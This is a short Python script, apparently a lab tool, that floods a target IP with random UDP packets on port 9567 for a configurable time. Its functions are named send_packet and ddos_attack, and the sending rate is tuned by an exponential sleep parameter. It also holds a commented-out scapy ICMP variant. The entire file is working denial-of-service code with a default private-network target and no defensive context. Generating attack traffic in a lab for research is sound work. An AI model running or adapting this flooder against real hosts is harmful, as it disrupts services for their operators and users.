#!/usr/bin/env python3
from scapy.all import *
import random
import string
import argparse

from scapy.layers.inet import IP, ICMP


def send_packet(dst_ip):
    # Generate random content
    # length = random.randint(5, 10)
    # random_content = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    # att_packet = IP(dst=dst_ip) / ICMP() / random_content
    # send(att_packet)
    c_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    length = random.randint(40, 60)
    random_content = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    c_socket.sendto(random_content.encode('utf-8'), (dst_ip, 9567))


def ddos_attack(ip_addr, attack_time, k, sleep):
    print(ip_addr)
    start_time = time.time()
    count = 0
    while True:
        if time.time() - start_time > attack_time:
            break
        send_packet(ip_addr)
        count += 1
        # define the function as f(k) = exp(-k/5)
        time.sleep(sleep * math.exp(-k / 5))
    print("send {} ddos packets to {}".format(count, ip_addr))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    # --ip_addr: server ip address, --k: parameter K, typically 0-10. --attack_time:
    parser.add_argument("--ip_addr", type=str, default='192.168.1.157')
    parser.add_argument("--attack_time", type=int, default=5)
    parser.add_argument("--k", type=int, default=0)
    args = parser.parse_args()
    ddos_attack(args.ip_addr, args.attack_time, args.k, 0.1)
